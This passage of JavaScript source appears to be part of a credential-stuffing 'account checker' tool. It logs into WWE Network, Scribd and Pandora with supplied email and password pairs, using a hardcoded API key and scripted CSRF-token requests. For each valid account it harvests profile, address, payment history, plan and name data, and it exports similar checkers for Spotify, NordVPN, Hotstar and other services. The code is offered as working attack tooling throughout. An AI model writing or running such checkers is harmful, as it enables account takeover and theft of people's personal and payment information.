                    url: 'https://dce-frontoffice.imggaming.com/api/v2/user/profile',
                    headers: {
                        'Authorization': 'Bearer ' + response.data.authorisationToken,
                        'realm': 'dce.wwe',
                        "accept": "*/*",
                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
                        "app": "dice",
                        "if-none-match": "",
                        "accept-language": "en-US;q=1.0",
                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
                    }
                };
                var configPayment = {
                    method: 'get',
                    url: 'https://dce-frontoffice.imggaming.com/api/v2/customer/history/payment',
                    headers: {
                        'Authorization': 'Bearer ' + response.data.authorisationToken,
                        'realm': 'dce.wwe',
                        "accept": "*/*",
                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
                        "app": "dice",
                        "if-none-match": "",
                        "accept-language": "en-US;q=1.0",
                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
                    }
                };
                var configAddress = {
                    method: 'get',
                    url: 'https://dce-frontoffice.imggaming.com/api/v2/user/address',
                    headers: {
                        'Authorization': 'Bearer ' + response.data.authorisationToken,
                        'realm': 'dce.wwe',
                        "accept": "*/*",
                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
                        "app": "dice",
                        "if-none-match": "",
                        "accept-language": "en-US;q=1.0",
                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
                    }
                };
                checkResult.validAccount = true;
                    checkResult.accountInfo.licences = await axios(configLicences)
                        .then(response =>response.data)
                        .catch(error =>{ return {}});

                    checkResult.accountInfo.address = await axios(configAddress)
                        .then(response => (response.data[0]))
                        .catch(error =>{ return {}});


                    checkResult.accountInfo.payment = await axios(configPayment)
                        .then(response => (response.data))
                        .catch(error =>{ return []});

                    checkResult.accountInfo.profile = await axios(configProfile)
                        .then(response => (response.data))
                        .catch(error =>{ return []});

            })
            .catch(function (error) {
                console.log(error);
            });
        return checkResult;
}

let scribdChecker = async (account,page) =>{
  var checkResult = {
      accountLogin: {
          email:account.login,
          password:account.password
      },
      validAccount:false,
      accountInfo:null
  };
  await page.goto('https://www.scribd.com/');
  const connect = await page.evaluate((account)=>{
      return fetch("https://www.scribd.com/csrf_token", {
          "headers": {
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
              "accept-language": "en-GB,en;q=0.9,en-US;q=0.8,ar;q=0.7,fr;q=0.6",
              "cache-control": "max-age=0",
              "if-none-match": "W/\"b696a7589f827807edda74fc78e21c6e\"",
              "sec-fetch-dest": "document",
              "sec-fetch-mode": "navigate",
              "sec-fetch-site": "none",
              "sec-fetch-user": "?1",
              "upgrade-insecure-requests": "1"
          },
          "referrerPolicy": "strict-origin-when-cross-origin",
          "body": null,
          "method": "GET",
          "mode": "cors",
          "credentials": "include"
      }).then(res=>res.json()).then(token=>{
          return fetch("https://www.scribd.com/login", {
              "headers": {
                  "accept": "*/*",
                  "accept-language": "en-US,en;q=0.9",
                  "content-type": "application/json",
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "x-csrf-token": token.csrf_token,
                  "x-requested-with": "XMLHttpRequest"
              },
              "referrer": "https://www.scribd.com/",
              "referrerPolicy": "strict-origin-when-cross-origin",
              "body": JSON.stringify({login_or_email:account.login,login_password:account.password,rememberme:"",signup_location:"https://www.scribd.com/",login_params:{}}),
              "method": "POST",
              "mode": "cors",
              "credentials": "include"
          })
              .then(res=>res.json())
              .then(i=>i);
      })
  },account);
  if(connect.login && connect.success){
      await page.goto('https://www.scribd.com/account-settings');
      await page.waitForSelector('.account_section');
      const scraped = await page.evaluate(()=>{
          var scrapedObj = {
              plan : "free",
              paymentInfo : null
          };
          if(document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(2) > div.col_right > div > div > div').innerText !== "You do not have a membership.")
          {
              scrapedObj.plan = document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(2) > div.col_right > div > div > div').innerText;
              scrapedObj.paymentInfo =document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(3) > div.col_right > div.info').innerText;
              scrapedObj.full_name = document.querySelector('div.auto__base_component.auto__account_settings_sections_personal > section > div > div.col_right > div:nth-child(1) > div.middle > div.row > div').innerText;
          }
          return scrapedObj;
      });
      checkResult.accountInfo = scraped;
      checkResult.validAccount = true;
  }
  return checkResult;
};

let pandoraChecker = async (account,page) => {
   var checkResult = {
       validAccount : false,
       accountLogin:{
           email:account.login,
           password:account.password
       },
       accountInfo:null
   };
   await page.goto('https://www.pandora.com/account/sign-in');
   //await page.waitForSelector('.Form--dark');
   const login = await page.evaluate((account)=>{
       var parsedCookie = () => {return document.cookie
           .split(';')
           .reduce((res, c) => {
               const [key, val] = c.trim().split('=').map(decodeURIComponent)
               try {
                   return Object.assign(res, { [key]: JSON.parse(val) })
               } catch (e) {
                   return Object.assign(res, { [key]: val })
               }
           }, {})};
       return fetch("https://www.pandora.com/api/v1/auth/login", {
           "headers": {
               "accept": "application/json, text/plain, */*",
               "accept-language": "en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6",
               "content-type": "application/json",
               "sec-fetch-dest": "empty",
               "sec-fetch-mode": "cors",
               "sec-fetch-site": "same-origin",
               "x-csrftoken": parsedCookie().csrftoken
           },
           "referrer": "https://www.pandora.com/account/sign-in",
           "referrerPolicy": "strict-origin-when-cross-origin",
           "body": JSON.stringify({username:account.login,password:account.password,existingAuthToken:null,keepLoggedIn:true}),
           "method": "POST",
           "mode": "cors",
           "credentials": "include"
       }).then(res=>res.json()).then(e => {
           if(!!e.message && !parseInt(e.errorCode)){
               return e
               // {
               // birthYear: e.birthYear,
               // gender: e.gender,
               // zipcode: e.zipCode,
               // profilePrivate: e.profilePrivate,
               // emailOptOut: e.emailOptOut,
               // allowProfileComments: e.allowProfileComments,
               // notifyOnComment: e.notifyOnComment,
               // notifyOnFollow: e.notifyOnFollow,
               // artistPromoEmailsEnabled: e.artistPromoEmailsEnabled,
               // artistAudioMessagesEnabled: e.artistAudioMessagesEnabled,
               // isNew: e.isNew,
               // branding: e.config.branding,
               // dailySkipLimit: e.config.dailySkipLimit,
               // stationSkipLimit: e.config.stationSkipLimit,
               // inactivityTimeout: e.config.inactivityTimeout
               //     }
           }else {
               return e;
           }
       });
   },account);
   if (login){
       checkResult.accountInfo = login;
       checkResult.validAccount = true;
   }
   console.log(login);
   return checkResult;
};

module.exports = {
    spotifyChecker:spotifyChecker,
    hotstarChecker:hotstarChecker,
    zee5Checker:zee5Checker,
    altbalajiChecker:altbalajiChecker,
    vootChecker:vootChecker,
    sonylivChecker:sonylivChecker,
    jiosaavnChecker:jiosaavnChecker,
    nordvpnChecker:nordvpnChecker,
    pornhubChecker:pornhubChecker,
    wweChecker:wweChecker,
    scribdChecker:scribdChecker,
    pandoraChecker,pandoraChecker
};
////////////////////validate email/////////////////////////////
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
///////////////////////////////////////////////////////////////

